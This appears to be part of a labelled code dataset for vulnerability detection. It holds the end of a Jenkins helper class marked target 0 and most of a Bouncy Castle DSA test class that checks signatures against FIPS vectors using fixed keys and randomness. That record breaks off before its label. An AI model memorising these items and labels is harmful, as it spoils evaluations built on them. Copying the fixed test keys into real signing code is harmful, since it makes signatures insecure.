Boolean.getBoolean(\"hudson.security.ArtifactsPermission\");\n    }\n\n    /**\n     * Returns {@code true} if the {@link Item#WIPEOUT} permission is enabled,\n     * {@code false} otherwise.\n     *\n     * <p>The \"Wipe Out Workspace\" action available on jobs is controlled by the\n     * {@link Item#BUILD} permission. For some specific projects, however, it is\n     * not acceptable to let users have this possibility, even it they can\n     * trigger builds. As such, when enabling the {@code hudson.security.WipeOutPermission}\n     * system property, a new \"WipeOut\" permission will allow to have greater\n     * control on the \"Wipe Out Workspace\" action.</p>\n     */\n    public static boolean isWipeOutPermissionEnabled() {\n        return Boolean.getBoolean(\"hudson.security.WipeOutPermission\");\n    }\n\n    public static String createRenderOnDemandProxy(JellyContext context, String attributesToCapture) {\n        return Stapler.getCurrentRequest().createJavaScriptProxy(new RenderOnDemandClosure(context,attributesToCapture));\n    }\n\n    public static String getCurrentDescriptorByNameUrl() {\n        return Descriptor.getCurrentDescriptorByNameUrl();\n    }\n    \n    public static String setCurrentDescriptorByNameUrl(String value) {\n        String o = getCurrentDescriptorByNameUrl();\n        Stapler.getCurrentRequest().setAttribute(\"currentDescriptorByNameUrl\", value);\n\n        return o;\n    }\n\n    public static void restoreCurrentDescriptorByNameUrl(String old) {\n        Stapler.getCurrentRequest().setAttribute(\"currentDescriptorByNameUrl\", old);\n    }\n\n    public static List<String> getRequestHeaders(String name) {\n        List<String> r = new ArrayList<String>();\n        Enumeration e = Stapler.getCurrentRequest().getHeaders(name);\n        while (e.hasMoreElements()) {\n            r.add(e.nextElement().toString());\n        }\n        return r;\n    }\n\n    /**\n     * Used for arguments to internationalized expressions to avoid escape\n     */\n    public static Object rawHtml(Object o) {\n        return o==null ? null : new RawHtmlArgument(o);\n    }\n\n    public static ArrayList<CLICommand> getCLICommands() {\n        ArrayList<CLICommand> all = new ArrayList<CLICommand>(CLICommand.all());\n        Collections.sort(all, new Comparator<CLICommand>() {\n            public int compare(CLICommand cliCommand, CLICommand cliCommand1) {\n                return cliCommand.getName().compareTo(cliCommand1.getName());\n            }\n        });\n        return all;\n    }\n\n    /**\n     * Returns an avatar image URL for the specified user and preferred image size\n     * @param user the user\n     * @param avatarSize the preferred size of the avatar image\n     * @return a URL string\n     * @since 1.433\n     */\n    public static String getAvatar(User user, String avatarSize) {\n        return UserAvatarResolver.resolve(user, avatarSize);\n    }\n\n    /**\n     * @deprecated as of 1.451\n     *      Use {@link #getAvatar}\n     */\n    public String getUserAvatar(User user, String avatarSize) {\n        return getAvatar(user,avatarSize);\n    }\n    \n    \n    /**\n     * Returns human readable information about file size\n     * \n     * @param file size in bytes\n     * @return file size in appropriate unit\n     */\n    public static String humanReadableByteSize(long size){\n        String measure = \"B\";\n        if(size < 1024){\n            return size + \" \" + measure;\n        }\n        Double number = new Double(size);\n        if(number>=1024){\n            number = number/1024;\n            measure = \"KB\";\n            if(number>=1024){\n                number = number/1024;\n                measure = \"MB\";\n                if(number>=1024){\n                    number=number/1024;\n                    measure = \"GB\";\n                }\n            }\n        }\n        DecimalFormat format = new DecimalFormat(\"#0.00\");\n        return format.format(number) + \" \" + measure;\n    }\n}\n", "target": 0}
{"idx": 1021, "func": "package org.bouncycastle.crypto.test;\n\nimport java.math.BigInteger;\nimport java.security.SecureRandom;\n\nimport org.bouncycastle.asn1.ASN1Integer;\nimport org.bouncycastle.asn1.ASN1Sequence;\nimport org.bouncycastle.crypto.AsymmetricCipherKeyPair;\nimport org.bouncycastle.crypto.digests.SHA224Digest;\nimport org.bouncycastle.crypto.digests.SHA256Digest;\nimport org.bouncycastle.crypto.digests.SHA3Digest;\nimport org.bouncycastle.crypto.generators.DSAKeyPairGenerator;\nimport org.bouncycastle.crypto.generators.DSAParametersGenerator;\nimport org.bouncycastle.crypto.params.DSAKeyGenerationParameters;\nimport org.bouncycastle.crypto.params.DSAParameterGenerationParameters;\nimport org.bouncycastle.crypto.params.DSAParameters;\nimport org.bouncycastle.crypto.params.DSAPrivateKeyParameters;\nimport org.bouncycastle.crypto.params.DSAPublicKeyParameters;\nimport org.bouncycastle.crypto.params.DSAValidationParameters;\nimport org.bouncycastle.crypto.params.ParametersWithRandom;\nimport org.bouncycastle.crypto.signers.DSADigestSigner;\nimport org.bouncycastle.crypto.signers.DSASigner;\nimport org.bouncycastle.util.Arrays;\nimport org.bouncycastle.util.BigIntegers;\nimport org.bouncycastle.util.Strings;\nimport org.bouncycastle.util.encoders.Hex;\nimport org.bouncycastle.util.test.FixedSecureRandom;\nimport org.bouncycastle.util.test.SimpleTest;\nimport org.bouncycastle.util.test.TestRandomBigInteger;\nimport org.bouncycastle.util.test.TestRandomData;\n\n/**\n * Test based on FIPS 186-2, Appendix 5, an example of DSA, and FIPS 168-3 test vectors.\n */\npublic class DSATest\n    extends SimpleTest\n{\n    byte[] k1 = Hex.decode(\"d5014e4b60ef2ba8b6211b4062ba3224e0427dd3\");\n    byte[] k2 = Hex.decode(\"345e8d05c075c3a508df729a1685690e68fcfb8c8117847e89063bca1f85d968fd281540b6e13bd1af989a1fbf17e06462bf511f9d0b140fb48ac1b1baa5bded\");\n\n    SecureRandom    random = new FixedSecureRandom(\n        new FixedSecureRandom.Source[] { new FixedSecureRandom.Data(k1), new FixedSecureRandom.Data(k2) });\n\n    byte[] keyData = Hex.decode(\"b5014e4b60ef2ba8b6211b4062ba3224e0427dd3\");\n    \n    SecureRandom    keyRandom = new FixedSecureRandom(\n                      new FixedSecureRandom.Source[] { new FixedSecureRandom.Data(keyData), new FixedSecureRandom.Data(keyData) });\n\n    BigInteger  pValue = new BigInteger(\"8df2a494492276aa3d25759bb06869cbeac0d83afb8d0cf7cbb8324f0d7882e5d0762fc5b7210eafc2e9adac32ab7aac49693dfbf83724c2ec0736ee31c80291\", 16);\n    BigInteger  qValue = new BigInteger(\"c773218c737ec8ee993b4f2ded30f48edace915f\", 16);\n\n    public String getName()\n    {\n        return \"DSA\";\n    }\n\n    public void performTest()\n    {\n        BigInteger              r = new BigInteger(\"68076202252361894315274692543577577550894681403\");\n        BigInteger              s = new BigInteger(\"1089214853334067536215539335472893651470583479365\");\n        DSAParametersGenerator  pGen = new DSAParametersGenerator();\n\n        pGen.init(512, 80, random);\n\n        DSAParameters           params = pGen.generateParameters();\n        DSAValidationParameters pValid = params.getValidationParameters();\n\n        if (pValid.getCounter() != 105)\n        {\n            fail(\"Counter wrong\");\n        }\n\n        if (!pValue.equals(params.getP()) || !qValue.equals(params.getQ()))\n        {\n            fail(\"p or q wrong\");\n        }\n\n        DSAKeyPairGenerator         dsaKeyGen = new DSAKeyPairGenerator();\n        DSAKeyGenerationParameters  genParam = new DSAKeyGenerationParameters(keyRandom, params);\n\n        dsaKeyGen.init(genParam);\n\n        AsymmetricCipherKeyPair  pair = dsaKeyGen.generateKeyPair();\n\n        ParametersWithRandom param = new ParametersWithRandom(pair.getPrivate(), keyRandom);\n\n        DSASigner dsa = new DSASigner();\n\n        dsa.init(true, param);\n\n        byte[] message = BigIntegers.asUnsignedByteArray(new BigInteger(\"968236873715988614170569073515315707566766479517\"));\n        BigInteger[] sig = dsa.generateSignature(message);\n\n        if (!r.equals(sig[0]))\n        {\n            fail(\"r component wrong.\", r, sig[0]);\n        }\n\n        if (!s.equals(sig[1]))\n        {\n            fail(\"s component wrong.\", s, sig[1]);\n        }\n\n        dsa.init(false, pair.getPublic());\n\n        if (!dsa.verifySignature(message, sig[0], sig[1]))\n        {\n            fail(\"verification fails\");\n        }\n\n        dsa2Test1();\n        dsa2Test2();\n        dsa2Test3();\n        dsa2Test4();\n\n        testDSAsha3(224, new BigInteger(\"613202af2a7f77e02b11b5c3a5311cf6b412192bc0032aac3ec127faebfc6bd0\", 16));\n        testDSAsha3(256, new BigInteger(\"2450755c5e15a691b121bc833b97864e34a61ee025ecec89289c949c1858091e\", 16));\n        testDSAsha3(384, new BigInteger(\"7aad97c0b71bb1e1a6483b6948a03bbe952e4780b0cee699a11731f90d84ddd1\", 16));\n        testDSAsha3(512, new BigInteger(\"725ad64d923c668e64e7c3898b5efde484cab49ce7f98c2885d2a13a9e355ad4\", 16));\n    }\n\n    private void testDSAsha3(int size, BigInteger s)\n    {\n        DSAParameters dsaParams = new DSAParameters(\n            new BigInteger(\n                        \"F56C2A7D366E3EBDEAA1891FD2A0D099\" +\n                        \"436438A673FED4D75F594959CFFEBCA7BE0FC72E4FE67D91\" +\n                        \"D801CBA0693AC4ED9E411B41D19E2FD1699C4390AD27D94C\" +\n                        \"69C0B143F1DC88932CFE2310C886412047BD9B1C7A67F8A2\" +\n                        \"5909132627F51A0C866877E672E555342BDF9355347DBD43\" +\n                        \"B47156B2C20BAD9D2B071BC2FDCF9757F75C168C5D9FC431\" +\n                        \"31BE162A0756D1BDEC2CA0EB0E3B018A8B38D3EF2487782A\" +\n                        \"EB9FBF99D8B30499C55E4F61E5C7DCEE2A2BB55BD7F75FCD\" +\n                        \"F00E48F2E8356BDB59D86114028F67B8E07B127744778AFF\" +\n                        \"1CF1399A4D679D92FDE7D941C5C85C5D7BFF91BA69F9489D\" +\n                        \"531D1EBFA727CFDA651390F8021719FA9F7216CEB177BD75\", 16),\n            new BigInteger(\"C24ED361870B61E0D367F008F99F8A1F75525889C89DB1B673C45AF5867CB467\", 16),\n            new BigInteger(\n                        \"8DC6CC814CAE4A1C05A3E186A6FE27EA\" +\n                        \"BA8CDB133FDCE14A963A92E809790CBA096EAA26140550C1\" +\n                        \"29FA2B98C16E84236AA33BF919CD6F587E048C52666576DB\" +\n                        \"6E925C6CBE9B9EC5C16020F9A44C9F1C8F7A8E611C1F6EC2\" +\n                        \"513EA6AA0B8D0F72FED73CA37DF240DB57BBB27431D61869\" +\n                        \"7B9E771B0B301D5DF05955425061A30DC6D33BB6D2A32BD0\" +\n                        \"A75A0A71D2184F506372ABF84A56AEEEA8EB693BF29A6403\" +\n                        \"45FA1298A16E85421B2208D00068A5A42915F82CF0B858C8\" +\n                        \"FA39D43D704B6927E0B2F916304E86FB6A1B487F07D8139E\" +\n                        \"428BB096C6D67A76EC0B8D4EF274B8A2CF556D279AD267CC\" +\n                        \"EF5AF477AFED029F485B5597739F5D0240F67C2D948A6279\", 16)\n        );\n\n        BigInteger x = new BigInteger(\"0CAF2EF547EC49C4F3A6FE6DF4223A174D01F2C115D49A6F73437C29A2A8458C\", 16);\n\n        BigInteger y = new BigInteger(\n                    \"2828003D7C747199143C370FDD07A286\" +\n                    \"1524514ACC57F63F80C38C2087C6B795B62DE1C224BF8D1D\" +\n                    \"1424E60CE3F5AE3F76C754A2464AF292286D873A7A30B7EA\" +\n                    \"CBBC75AAFDE7191D9157598CDB0B60E0C5AA3F6EBE425500\" +\n                    \"C611957DBF5ED35490714A42811FDCDEB19AF2AB30BEADFF\" +\n                    \"2907931CEE7F3B55532CFFAEB371F84F01347630EB227A41\" +\n                    \"9B1F3F558BC8A509D64A765D8987D493B007C4412C297CAF\" +\n                    \"41566E26FAEE475137EC781A0DC088A26C8804A98C23140E\" +\n                    \"7C936281864B99571EE95C416AA38CEEBB41FDBFF1EB1D1D\" +\n                    \"C97B63CE1355257627C8B0FD840DDB20ED35BE92F08C49AE\" +\n                    \"A5613957D7E5C7A6D5A5834B4CB069E0831753ECF65BA02B\", 16);\n\n        DSAPrivateKeyParameters priKey = new DSAPrivateKeyParameters(x, dsaParams);\n        SecureRandom k = new TestRandomBigInteger(\"72546832179840998877302529996971396893172522460793442785601695562409154906335\");\n\n        byte[] M = Hex.decode(\"1BD4ED430B0F384B4E8D458EFF1A8A553286D7AC21CB2F6806172EF5F94A06AD\");\n\n        DSADigestSigner dsa = new DSADigestSigner(new DSASigner(), new SHA3Digest(size));\n\n        dsa.init(true, new ParametersWithRandom(priKey, k));\n\n        dsa.update(M, 0, M.length);\n\n        byte[] encSig = dsa.generateSignature();\n\n        ASN1Sequence sig = ASN1Sequence.getInstance(encSig);\n\n        BigInteger r = new BigInteger(\"4864074fe30e6601268ee663440e4d9b703f62673419864e91e9edb0338ce510\", 16);\n\n        BigInteger sigR = ASN1Integer.getInstance(sig.getObjectAt(0)).getValue();\n        if (!r.equals(sigR))\n        {\n            fail(\"r component wrong.\" + Strings.lineSeparator()\n                + \" expecting: \" + r.toString(16) + Strings.lineSeparator()\n                + \" got      : \" + sigR.toString(16));\n        }\n\n        BigInteger sigS = ASN1Integer.getInstance(sig.getObjectAt(1)).getValue();\n        if (!s.equals(sigS))\n        {\n            fail(\"s component wrong.\" + Strings.lineSeparator()\n                + \" expecting: \" + s.toString(16) + Strings.lineSeparator()\n                + \" got      : \" + sigS.toString(16));\n        }\n\n        // Verify the signature\n        DSAPublicKeyParameters pubKey = new DSAPublicKeyParameters(y, dsaParams);\n\n        dsa.init(false, pubKey);\n\n        dsa.update(M, 0, M.length);\n\n        if (!dsa.verifySignature(encSig))\n        {\n            fail(\"signature fails\");\n        }\n    }\n\n    private void dsa2Test1()\n    {\n        byte[] seed = Hex.decode(\"ED8BEE8D1CB89229D2903CBF0E51EE7377F48698\");\n\n        DSAParametersGenerator pGen = new DSAParametersGenerator();\n\n        pGen.init(new DSAParameterGenerationParameters(1024, 160, 80, new DSATestSecureRandom(seed)));\n\n        DSAParameters params = pGen.generateParameters();\n\n        DSAValidationParameters pv = params.getValidationParameters();\n\n        if (pv.getCounter() != 5)\n        {\n            fail(\"counter incorrect\");\n        }\n\n        if (!Arrays.areEqual(seed, pv.getSeed()))\n        {\n            fail(\"seed incorrect\");\n        }\n\n        if (!params.getQ().equals(new BigInteger(\"E950511EAB424B9A19A2AEB4E159B7844C589C4F\", 16)))\n        {\n            fail(\"Q incorrect\");\n        }\n\n        if (!params.getP().equals(new BigInteger(\n            \"E0A67598CD1B763B\" +\n            \"C98C8ABB333E5DDA0CD3AA0E5E1FB5BA8A7B4EABC10BA338\" +\n            \"FAE06DD4B90FDA70D7CF0CB0C638BE3341BEC0AF8A7330A3\" +\n            \"307DED2299A0EE606DF035177A239C34A912C202AA5F83B9\" +\n            \"C4A7CF0235B5316BFC6EFB9A248411258B30B839AF172440\" +\n            \"F32563056CB67A861158DDD90E6A894C72A5BBEF9E286C6B\", 16)))\n        {\n            fail(\"P incorrect\");\n        }\n\n        if (!params.getG().equals(new BigInteger(\n            \"D29D5121B0423C27\" +\n            \"69AB21843E5A3240FF19CACC792264E3BB6BE4F78EDD1B15\" +\n            \"C4DFF7F1D905431F0AB16790E1F773B5CE01C804E509066A\" +\n            \"9919F5195F4ABC58189FD9FF987389CB5BEDF21B4DAB4F8B\" +\n            \"76A055FFE2770988FE2EC2DE11AD92219F0B351869AC24DA\" +\n            \"3D7BA87011A701CE8EE7BFE49486ED4527B7186CA4610A75\", 16)))\n        {\n            fail(\"G incorrect\");\n        }\n\n        DSAKeyPairGenerator kpGen = new DSAKeyPairGenerator();\n\n        kpGen.init(new DSAKeyGenerationParameters(new TestRandomBigInteger(\"D0EC4E50BB290A42E9E355C73D8809345DE2E139\", 16), params));\n\n        AsymmetricCipherKeyPair kp = kpGen.generateKeyPair();\n\n        DSAPublicKeyParameters pub = (DSAPublicKeyParameters)kp.getPublic();\n        DSAPrivateKeyParameters priv = (DSAPrivateKeyParameters)kp.getPrivate();\n\n        if (!pub.getY().equals(new BigInteger(\n            \"25282217F5730501\" +\n            \"DD8DBA3EDFCF349AAFFEC20921128D70FAC44110332201BB\" +\n            \"A3F10986140CBB97C726938060473C8EC97B4731DB004293\" +\n            \"B5E730363609DF9780F8D883D8C4D41DED6A2F1E1BBBDC97\" +\n            \"9E1B9D6D3C940301F4E978D65B19041FCF1E8B518F5C0576\" +\n            \"C770FE5A7A485D8329EE2914A2DE1B5DA4A6128CEAB70F79\", 16)))\n        {\n            fail(\"Y value incorrect\");\n        }\n\n        if (!priv.getX().equals(\n            new BigInteger(\"D0EC4E50BB290A42E9E355C73D8809345DE2E139\", 16)))\n        {\n            fail(\"X value incorrect\");\n        }\n\n        DSASigner signer = new DSASigner();\n\n        signer.init(true, new ParametersWithRandom(kp.getPrivate(), new TestRandomBigInteger(\"349C55648DCF992F3F33E8026CFAC87C1D2BA075\", 16)));\n\n        byte[] msg = Hex.decode(\"A9993E364706816ABA3E25717850C26C9CD0D89D\");\n\n        BigInteger[] sig = signer.generateSignature(msg);\n\n        if (!sig[0].equals(new BigInteger(\"636155AC9A4633B4665D179F9E4117DF68601F34\", 16)))\n        {\n            fail(\"R value incorrect\");\n        }\n\n        if (!sig[1].equals(new BigInteger(\"6C540B02D9D4852F89DF8CFC99963204F4347704\", 16)))\n        {\n            fail(\"S value incorrect\");\n        }\n\n        signer.init(false, kp.getPublic());\n\n        if (!signer.verifySignature(msg, sig[0], sig[1]))\n        {\n            fail(\"signature not verified\");\n        }\n\n    }\n\n    private void dsa2Test2()\n        {\n            byte[] seed = Hex.decode(\"5AFCC1EFFC079A9CCA6ECA86D6E3CC3B18642D9BE1CC6207C84002A9\");\n\n            DSAParametersGenerator pGen = new DSAParametersGenerator(new SHA224Digest());\n\n            pGen.init(new DSAParameterGenerationParameters(2048, 224, 80, new DSATestSecureRandom(seed)));\n\n            DSAParameters params = pGen.generateParameters();\n\n            DSAValidationParameters pv = params.getValidationParameters();\n\n            if (pv.getCounter() != 21)\n            {\n                fail(\"counter incorrect\");\n            }\n\n            if (!Arrays.areEqual(seed, pv.getSeed()))\n            {\n                fail(\"seed incorrect\");\n            }\n\n            if (!params.getQ().equals(new BigInteger(\"90EAF4D1AF0708B1B612FF35E0A2997EB9E9D263C9CE659528945C0D\", 16)))\n            {\n                fail(\"Q incorrect\");\n            }\n\n            if (!params.getP().equals(new BigInteger(\n                \"C196BA05AC29E1F9C3C72D56DFFC6154\" +\n                \"A033F1477AC88EC37F09BE6C5BB95F51C296DD20D1A28A06\" +\n                \"7CCC4D4316A4BD1DCA55ED1066D438C35AEBAABF57E7DAE4\" +\n                \"28782A95ECA1C143DB701FD48533A3C18F0FE23557EA7AE6\" +\n                \"19ECACC7E0B51652A8776D02A425567DED36EABD90CA33A1\" +\n                \"E8D988F0BBB92D02D1D20290113BB562CE1FC856EEB7CDD9\" +\n                \"2D33EEA6F410859B179E7E789A8F75F645FAE2E136D252BF\" +\n                \"FAFF89528945C1ABE705A38DBC2D364AADE99BE0D0AAD82E\" +\n                \"5320121496DC65B3930E38047294FF877831A16D5228418D\" +\n                \"E8AB275D7D75651CEFED65F78AFC3EA7FE4D79B35F62A040\" +\n                \"2A1117599ADAC7B269A59F353CF450E6982D3B1702D9CA83\", 16)))\n            {\n                fail(\"P incorrect\");\n            }\n\n            if (!params.getG().equals(new BigInteger(\n                \"A59A749A11242C58C894E9E5A91804E8\"+\n                \"FA0AC64B56288F8D47D51B1EDC4D65444FECA0111D78F35F\"+\n                \"C9FDD4CB1F1B79A3BA9CBEE83A3F811012503C8117F98E50\"+\n                \"48B089E387AF6949BF8784EBD9EF45876F2E6A5A495BE64B\"+\n                \"6E770409494B7FEE1DBB1E4B2BC2A53D4F893D418B715959\"+\n                \"2E4FFFDF6969E91D770DAEBD0B5CB14C00AD68EC7DC1E574\"+\n                \"5EA55C706C4A1C5C88964E34D09DEB753AD418C1AD0F4FDF\"+\n                \"D049A955E5D78491C0B7A2F1575A008CCD727AB376DB6E69\"+\n                \"5515B05BD412F5B8C2F4C77EE10DA48ABD53F5DD498927EE\"+\n                \"7B692BBBCDA2FB23A516C5B4533D73980B2A3B60E384ED20\"+\n                \"0AE21B40D273651AD6060C13D97FD69AA13C5611A51B9085\", 16)))\n            {\n                fail(\"G incorrect\");\n            }\n\n            DSAKeyPairGenerator kpGen = new DSAKeyPairGenerator();\n\n            kpGen.init(new DSAKeyGenerationParameters(new TestRandomData(Hex.decode(\"00D0F09ED3E2568F6CADF9224117DA2AEC5A4300E009DE1366023E17\")), params));\n\n            AsymmetricCipherKeyPair kp = kpGen.generateKeyPair();\n\n            DSAPublicKeyParameters pub = (DSAPublicKeyParameters)kp.getPublic();\n            DSAPrivateKeyParameters priv = (DSAPrivateKeyParameters)kp.getPrivate();\n\n            if (!pub.getY().equals(new BigInteger(\n                \"70035C9A3B225B258F16741F3941FBF0\" +\n                \"6F3D056CD7BD864604CBB5EE9DD85304EE8E8E4ABD5E9032\" +\n                \"11DDF25CE149075510ACE166970AFDC7DF552B7244F342FA\" +\n                \"02F7A621405B754909D757F97290E1FE5036E904CF593446\" +\n                \"0C046D95659821E1597ED9F2B1F0E20863A6BBD0CE74DACB\" +\n                \"A5D8C68A90B29C2157CDEDB82EC12B81EE3068F9BF5F7F34\" +\n                \"6ECA41ED174CCCD7D154FA4F42F80FFE1BF46AE9D8125DEB\" +\n                \"5B4BA08A72BDD86596DBEDDC9550FDD650C58F5AE5133509\" +\n                \"A702F79A31ECB490F7A3C5581631F7C5BE4FF7F9E9F27FA3\" +\n                \"90E47347AD1183509FED6FCF198BA9A71AB3335B4F38BE8D\" +\n                \"15496A00B6DC2263E20A5F6B662320A3A1EC033AA61E3B68\", 16)))\n            {\n                fail(\"Y value incorrect\");\n            }\n\n            if (!priv.getX().equals(\n                new BigInteger(\"00D0F09ED3E2568F6CADF9224117DA2AEC5A4300E009DE1366023E17\", 16)))\n            {\n                fail(\"X value incorrect\");\n            }\n\n            DSASigner signer = new DSASigner();\n\n            signer.init(true, new ParametersWithRandom(kp.getPrivate(), new TestRandomData(Hex.decode(\"735959CC4463B8B440E407EECA8A473BF6A6D1FE657546F67D401F05\"))));\n\n            byte[] msg = Hex.decode(\"23097D223405D8228642A477BDA255B32AADBCE4BDA0B3F7E36C9DA7\");\n\n            BigInteger[] sig = signer.generateSignature(msg);\n\n            if (!sig[0].equals(new BigInteger(\"4400138D05F9639CAF54A583CAAF25D2B76D0C3EAD752CE17DBC85FE\", 16)))\n            {\n                fail(\"R value incorrect\");\n            }\n\n            if (!sig[1].equals(new BigInteger(\"874D4F12CB13B61732D398445698CFA9D92381D938AA57EE2C9327B3\", 16)))\n            {\n                fail(\"S value incorrect\");\n            }\n\n            signer.init(false, kp.getPublic());\n\n            if (!signer.verifySignature(msg, sig[0], sig[1]))\n            {\n                fail(\"signature not verified\");\n            }\n        }\n\n    private void dsa2Test3()\n    {\n        byte[] seed = Hex.decode(\"4783081972865EA95D43318AB2EAF9C61A2FC7BBF1B772A09017BDF5A58F4FF0\");\n\n        DSAParametersGenerator pGen = new DSAParametersGenerator(new SHA256Digest());\n\n        pGen.init(new DSAParameterGenerationParameters(2048, 256, 80, new DSATestSecureRandom(seed)));\n\n        DSAParameters params = pGen.generateParameters();\n\n        DSAValidationParameters pv = params.getValidationParameters();\n\n        if (pv.getCounter() != 12)\n        {\n            fail(\"counter incorrect\");\n        }\n\n        if (!Arrays.areEqual(seed, pv.getSeed()))\n        {\n            fail(\"seed incorrect\");\n        }\n\n        if (!params.getQ().equals(new BigInteger(\"C24ED361870B61E0D367F008F99F8A1F75525889C89DB1B673C45AF5867CB467\", 16)))\n        {\n            fail(\"Q incorrect\");\n        }\n\n        if (!params.getP().equals(new BigInteger(\n            \"F56C2A7D366E3EBDEAA1891FD2A0D099\" +\n            \"436438A673FED4D75F594959CFFEBCA7BE0FC72E4FE67D91\" +\n            \"D801CBA0693AC4ED9E411B41D19E2FD1699C4390AD27D94C\" +\n            \"69C0B143F1DC88932CFE2310C886412047BD9B1C7A67F8A2\" +\n            \"5909132627F51A0C866877E672E555342BDF9355347DBD43\" +\n            \"B47156B2C20BAD9D2B071BC2FDCF9757F75C168C5D9FC431\" +\n            \"31BE162A0756D1BDEC2CA0EB0E3B018A8B38D3EF2487782A\" +\n            \"EB9FBF99D8B30499C55E4F61E5C7DCEE2A2BB55BD7F75FCD\" +\n            \"F00E48F2E8356BDB59D86114028F67B8E07B127744778AFF\" +\n            \"1CF1399A4D679D92FDE7D941C5C85C5D7BFF91BA69F9489D\" +\n            \"531D1EBFA727CFDA651390F8021719FA9F7216CEB177BD75\", 16)))\n        {\n            fail(\"P incorrect\");\n        }\n\n        if (!params.getG().equals(new BigInteger(\n            \"8DC6CC814CAE4A1C05A3E186A6FE27EA\" +\n            \"BA8CDB133FDCE14A963A92E809790CBA096EAA26140550C1\" +\n            \"29FA2B98C16E84236AA33BF919CD6F587E048C52666576DB\" +\n            \"6E925C6CBE9B9EC5C16020F9A44C9F1C8F7A8E611C1F6EC2\" +\n            \"513EA6AA0B8D0F72FED73CA37DF240DB57BBB27431D61869\" +\n            \"7B9E771B0B301D5DF05955425061A30DC6D33BB6D2A32BD0\" +\n            \"A75A0A71D2184F506372ABF84A56AEEEA8EB693BF29A6403\" +\n            \"45FA1298A16E85421B2208D00068A5A42915F82CF0B858C8\" +\n            \"FA39D43D704B6927E0B2F916304E86FB6A1B487F07D8139E\" +\n            \"428BB096C6D67A76EC0B8D4EF274B8A2CF556D279AD267CC\" +\n            \"EF5AF477AFED029F485B5597739F5D0240F67C2D948A6279\", 16)))\n        {\n            fail(\"G incorrect\");\n        }\n\n        DSAKeyPairGenerator kpGen = new DSAKeyPairGenerator();\n\n        kpGen.init(new DSAKeyGenerationParameters(new TestRandomData(Hex.decode(\"0CAF2EF547EC49C4F3A6FE6DF4223A174D01F2C115D49A6F73437C29A2A8458C\")), params));\n\n        AsymmetricCipherKeyPair kp = kpGen.generateKeyPair();\n\n        DSAPublicKeyParameters pub = (DSAPublicKeyParameters)kp.getPublic();\n        DSAPrivateKeyParameters priv = (DSAPrivateKeyParameters)kp.getPrivate();\n\n        if (!pub.getY().equals(new BigInteger(\n            \"2828003D7C747199143C370FDD07A286\" +\n            \"1524514ACC57F63F80C38C2087C6B795B62DE1C224BF8D1D\" +\n            \"1424E60CE3F5AE3F76C754A2464AF292286D873A7A30B7EA\" +\n            \"CBBC75AAFDE7191D9157598CDB0B60E0C5AA3F6EBE425500\" +\n            \"C611957DBF5ED35490714A42811FDCDEB19AF2AB30BEADFF\" +\n            \"2907931CEE7F3B55532CFFAEB371F84F01347630EB227A41\" +\n            \"9B1F3F558BC8A509D64A765D8987D493B007C4412C297CAF\" +\n            \"41566E26FAEE475137EC781A0DC088A26C8804A98C23140E\" +\n            \"7C936281864B99571EE95C416AA38CEEBB41FDBFF1EB1D1D\" +\n            \"C97B63CE1355257627C8B0FD840DDB20ED35BE92F08C49AE\" +\n            \"A5613957D7E5C7A6D5A5834B4CB069E0831753ECF65BA02B\", 16)))\n        {\n            fail(\"Y value incorrect\");\n        }\n\n        if (!priv.getX().equals(\n            new BigInteger(\"0CAF2EF547EC49C4F3A6FE6DF4223A174D01F2C115D49A6F73437C29A2A8458C\", 16)))\n        {\n            fail(\"X value incorrect\");\n        }\n\n        DSASigner signer = new DSASigner();\n\n        signer.init(true, new ParametersWithRandom(kp.getPrivate(), new TestRandomData(Hex.decode(\"0CAF2EF547EC49C4F3A6FE6DF4223A174D01F2C115D49A6F73437C29A2A8458C\"))));\n\n        byte[] msg = Hex.decode(\"BA7816BF8F01CFEA414140DE5DAE2223B00361A396177A9CB410FF61F20015AD\");\n\n        BigInteger[] sig = signer.generateSignature(msg);\n\n        if (!sig[0].equals(new BigInteger(\"315C875DCD4850E948B8AC42824E9483A32D5BA5ABE0681B9B9448D444F2BE3C\", 16)))\n        {\n            fail(\"R value incorrect\");\n        }\n\n        if (!sig[1].equals(new BigInteger(\"89718D12E54A8D9ED066E4A55F7ED5A2229CD23B9A3CEE78F83ED6AA61F6BCB9\", 16)))\n        {\n            fail(\"S value incorrect\");\n        }\n\n        signer.init(false, kp.getPublic());\n\n        if (!signer.verifySignature(msg, sig[0], sig[1]))\n        {\n            fail(\"signature not verified\");\n        }\n    }\n\n    private void dsa2Test4()\n    {\n        byte[] seed = Hex.decode(\"193AFCA7C1E77B3C1ECC618C81322E47B8B8B997C9C83515C59CC446C2D9BD47\");\n\n        DSAParametersGenerator pGen = new DSAParametersGenerator(new SHA256Digest());\n\n        pGen.init(new DSAParameterGenerationParameters(3072, 256, 80, new DSATestSecureRandom(seed)));\n\n        DSAParameters params = pGen.generateParameters();\n\n        DSAValidationParameters pv = params.getValidationParameters();\n\n        if (pv.getCounter() != 20)\n        {\n            fail(\"counter incorrect\");\n        }\n\n        if (!Arrays.areEqual(seed, pv.getSeed()))\n        {\n            fail(\"seed incorrect\");\n        }\n\n        if (!params.getQ().equals(new BigInteger(\"CFA0478A54717B08CE64805B76E5B14249A77A4838469DF7F7DC987EFCCFB11D\", 16)))\n        {\n            fail(\"Q incorrect\");\n        }\n\n        if (!params.getP().equals(new BigInteger(\n            \"90066455B5CFC38F9CAA4A48B4281F292C260FEEF01FD610\" +\n            \"37E56258A7795A1C7AD46076982CE6BB956936C6AB4DCFE0\" +\n            \"5E6784586940CA544B9B2140E1EB523F009D20A7E7880E4E\" +\n            \"5BFA690F1B9004A27811CD9904AF70420EEFD6EA11EF7DA1\" +\n            \"29F58835FF56B89FAA637BC9AC2EFAAB903402229F491D8D\" +\n            \"3485261CD068699B6BA58A1DDBBEF6DB51E8FE34E8A78E54\" +\n            \"2D7BA351C21EA8D8F1D29F5D5D15939487E27F4416B0CA63\" +\n            \"2C59EFD1B1EB66511A5A0FBF615B766C5862D0BD8A3FE7A0\" +\n            \"E0DA0FB2FE1FCB19E8F9996A8EA0FCCDE538175238FC8B0E\" +\n            \"E6F29AF7F642773EBE8CD5402415A01451A840476B2FCEB0\" +\n            \"E388D30D4B376C37FE401C2A2C2F941DAD179C540C1C8CE0\" +\n            \"30D460C4D983BE9AB0B20F69144C1AE13F9383EA1C08504F\" +\n            \"B0BF321503EFE43488310DD8DC77EC5B8349B8BFE97C2C56\" +\n            \"0EA878DE87C11E3D597F1FEA742D73EEC7F37BE43949EF1A\" +\n            \"0D15C3F3E3FC0A8335617055AC91328EC22B50FC15B941D3\" +\n            \"D1624CD88BC25F3E941FDDC6200689581BFEC416B4B2CB73\", 16)))\n        {\n            